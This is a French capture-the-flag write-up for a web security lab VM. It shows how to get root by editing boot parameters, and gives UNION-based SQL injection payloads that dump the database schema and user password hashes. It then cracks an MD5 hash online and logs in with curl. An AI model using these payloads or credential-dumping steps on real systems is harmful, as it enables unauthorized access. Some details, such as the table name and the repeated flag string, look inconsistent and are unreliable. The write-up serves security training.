# BONUS

## Obtention de nombreux flags

### Lancement de la VM

Lancer la VM et rester appuyé sur la touche `shift`.

### Obtention des droits root

Lancer la commande `live init=/bin/bash`.

### Récupération des flags

On peut récupérer tous les flags à l'exception de ceux contenus dans les bases de données sql grâce à la commande suivante:
`cat /var/www/html/includes/* /var/www/html/index.php | grep -i flag`

## 12_signin alternatif

Il est possible d'obtenir le flag de la page: [signin](http://10.12.1.129/?page=signin) sans utiliser de brute force.<br>
La base de données: `Member_Brute_Force` contient les hash md5 des utilisateurs:

### INJECTIONS SQL

La commande:
`1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`.<br>
permet d'apprendre que dans la base de données `Member_Brute_Force` se trouve une table unique: `db_default`.

La commande:
`1=1 UNION SELECT table_name, column_name FROM information_schema.columns`<br>
permet d'apprendre que dans la table "list_images" se trouvent les colonnes suivantes:

- id
- username
- password

Il est donc possible de vérifier le contenu de toutes ces tables.<br>
voici la partie intéressante de la commande:
`1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default`.

```
root
3bf1114a986ba87ed28fc1b5884fc2f8
```

On peut décrypter le mot de passe grâce au site [md5 decrypt](https://md5decrypt.net/), qui donne: `shadow`.<br>
Et lancer la commande:<br>
`curl -s -X GET  "http://10.12.1.129/?page=signin&username=root&password=shadow&Login=Login"`.<br>
Nous pouvons avoir le flag: `6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b26e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b26e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`.